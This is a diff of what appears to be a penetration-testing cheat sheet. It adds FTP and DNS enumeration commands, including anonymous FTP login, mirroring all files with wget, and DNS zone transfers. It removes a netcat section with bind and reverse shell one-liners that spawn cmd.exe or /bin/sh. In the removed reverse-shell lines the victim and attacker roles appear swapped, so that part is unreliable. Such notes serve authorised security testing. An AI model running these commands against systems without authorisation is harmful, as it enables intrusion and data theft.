@@ -17,8 +17,17 @@ nmap --script-help ftp-anon
 
 # FTP (21)
 ```
+# BANNER GRAB
+nc -nv $IP 21
 
+# ANONYMOUS LOGIN
+ftp $IP
+    USER: anonymous
+    PASS: <blank>
 
+# DOWNLOAD ALL FTP DIRS AND FILES
+wget --mirror ftp://$IP
+wget --no-passive-ftp --mirror ftp://$IP            # If PASV transfer is disabled
 ```
 
 # HTTP (80) / HTTPS (443)
@@ -36,27 +45,18 @@ whatweb http://<IP>:<PORT> -a 4
 webtech -u <IP>
 ```
 
-# NETCAT
-```
-# BIND SHELL
-=> VICTIM MACHINE
-$ nc -nlvp $RPORT -e cmd.exe    # WINDOWS
-$ nc -nlvp $RPORT -e /bin/sh    # LINUX
-
-=> ATTACK MACHINE
-> nc -nv $RHOST $RPORT
-
-# REVERSE SHELL
-=> VICTIM MACHINE
-> nc -nlvp $LPORT
-
-=> ATTACK MACHINE
-> nc -nv $LHOST $LPORT -e /bin/bash
-```
-
 # DNS (53)
 ```
-
+dnsrecon -r 127.0.0.0/24 -n {IP} -d {Domain_Name}
+dnsrecon -r {Network}{CIDR} -n {IP} -d {Domain_Name}
+dig axfr @{IP}
+dig axfr {Domain_Name} @{IP}
+nslookup
+    SERVER {IP}
+    127.0.0.1
+    {IP}
+    Domain_Name
+    exit
 ```
 
 
